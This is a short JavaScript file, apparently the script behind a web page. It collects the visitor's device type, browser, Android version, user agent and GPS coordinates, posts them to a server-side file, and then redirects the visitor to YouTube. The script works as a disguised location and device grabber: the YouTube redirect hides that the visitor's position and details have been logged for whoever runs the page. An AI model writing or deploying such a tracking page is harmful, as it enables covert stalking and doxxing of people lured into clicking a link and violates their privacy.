const userAgent = navigator.userAgent;
let deviceType = /Mobile|Android/i.test(userAgent) ? "Téléphone" : "Ordinateur";

let browser = "Navigateur inconnu";
if (userAgent.includes("Chrome")) browser = "Chrome";
else if (userAgent.includes("Firefox")) browser = "Firefox";
else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) browser = "Safari";
else if (userAgent.includes("Edge")) browser = "Edge";

let androidVersion = userAgent.match(/Android\s+([\d.]+)/);
let version = androidVersion ? androidVersion[1] : "Non Android ou non détecté";

const infos = {
    appareil: deviceType,
    navigateur: browser,
    versionAndroid: version,
    userAgent: userAgent,
    timestamp: new Date().toISOString()
};

function envoyerInfos(position) {
    if (position) {
        infos.latitude = position.coords.latitude;
        infos.longitude = position.coords.longitude;
    } else {
        infos.latitude = "Refusé";
        infos.longitude = "Refusé";
    }

    fetch("data.json", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(infos)
    });

    setTimeout(() => {
        window.location.href = "https://www.youtube.com/";
    }, 2000);
}

if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
        pos => envoyerInfos(pos),
        () => envoyerInfos(null)
    );
} else {
    envoyerInfos(null);
}